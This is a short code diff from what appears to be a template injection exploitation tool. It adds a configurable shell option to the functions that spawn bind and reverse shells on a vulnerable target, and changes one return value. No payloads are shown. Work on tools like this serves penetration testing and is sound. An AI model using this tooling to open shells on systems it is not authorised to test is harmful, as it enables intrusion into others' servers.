@@ -187,7 +187,7 @@ def check_template_injection(channel):
             if not urlparsed.hostname:
                 log.log(22, "Error parsing hostname")
                 return current_plugin
-            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port)):
+            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port, shell=channel.args.get('remote_shell'))):
                 log.log(26, f'Spawn a shell on remote port {bind_shell_port} with payload {idx+1}')
                 thread.join(timeout=1)
                 if not thread.is_alive():
@@ -207,7 +207,7 @@ def check_template_injection(channel):
         host, port = reverse_shell_host_port
         timeout = 15
         if channel.data.get('reverse_shell'):
-            current_plugin.reverse_shell(host, port)
+            current_plugin.reverse_shell(host, port, shell=channel.args.get('remote_shell'))
             # Run tcp server
             try:
                 TcpServer(int(port), timeout)
@@ -285,7 +285,7 @@ def scan_website(args):
     args['target_forms'] = forms
     if not urls and not forms:
         log.log(22, 'No targets found')
-        return
+        return None, None
     elif not forms:
         for url in urls:
             log.log(27, f'Scanning url: {url}')
